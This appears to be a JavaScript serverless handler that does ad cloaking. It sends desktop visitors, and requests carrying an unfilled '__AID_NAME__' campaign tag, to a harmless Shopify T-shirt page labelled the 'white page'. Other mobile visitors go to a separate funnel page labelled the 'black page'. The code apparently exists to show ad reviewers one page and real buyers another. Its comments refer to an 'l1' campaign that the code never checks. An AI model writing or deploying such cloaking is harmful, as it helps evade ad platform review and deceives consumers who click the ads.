export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://draggydreamz.myshopify.com/products/best-hot-selling-cotton-blend-half-sleeves-t-shirt-for-men-white-l-cpshat9bgdj7apc252l0?variant=50262108242201";
    const blackPageURL = "https://suqiqwopzxkasuewq.myfunnelish.com/jj-dd-spr-1738364604529104-1738364997483090-1739239513447558";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
